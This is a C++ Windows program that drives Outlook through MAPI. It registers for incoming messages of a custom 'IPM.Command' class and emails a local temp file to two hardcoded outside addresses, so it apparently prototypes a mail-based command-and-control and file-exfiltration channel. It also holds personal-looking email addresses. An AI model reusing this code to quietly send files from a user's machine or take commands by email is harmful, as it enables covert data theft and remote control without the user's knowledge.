#include <Windows.h>
#include "../MapiFiles/MAPIShell.h"
#include "../MapiFiles/MapiUtil.h"
#include <vector>
#include <atlstr.h>

LPMAPIINITIALIZE pfnMAPIInitialize = NULL;
LPMAPIUNINITIALIZE pfnMAPIUninitialize = NULL;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HRESULT hRes = S_OK;
	LPMAPISESSION FAR lpMAPISession = NULL;
	LPMDB lpMDB = NULL;
	LPMAPIFOLDER lpFolder = NULL;
	std::vector<CString> lpRecipients{ "buhni99@walla.com", "sahar15926@outlook.com" };

	BOOL ret = InitializeSession(lpMAPISession);
	if (ret == FALSE)
		return FALSE;

	hRes = SetReceiveFolder(lpMAPISession);
	if (FAILED(hRes)) goto quit;

	hRes = OpenDefaultMessageStore(lpMAPISession, &lpMDB, FALSE);
	if (FAILED(hRes)) goto quit;

	hRes = OpenInbox(lpMDB, &lpFolder, (LPSTR)"IPM.Command");
	if (FAILED(hRes)) goto quit;

	RegisterNewMessage(lpMDB, lpFolder);
	//ListMessages(lpMDB, lpFolder, "Test Subject");
	
	SendMail(lpMAPISession, lpMDB, "Test Subject", "Test Body", lpRecipients, "Sahar", "C:\\windows\\temp\\a.txt");
	while (1) {
		Sleep(1000);
	}

quit:
	if (lpMDB) {
		ULONG ulFlags = LOGOFF_NO_WAIT;
		lpMDB->StoreLogoff(&ulFlags);
		lpMDB->Release();
		lpMDB = NULL;
	}
	if (lpMAPISession) lpMAPISession->Release();

	MAPIUninitialize();

	return 1;
}
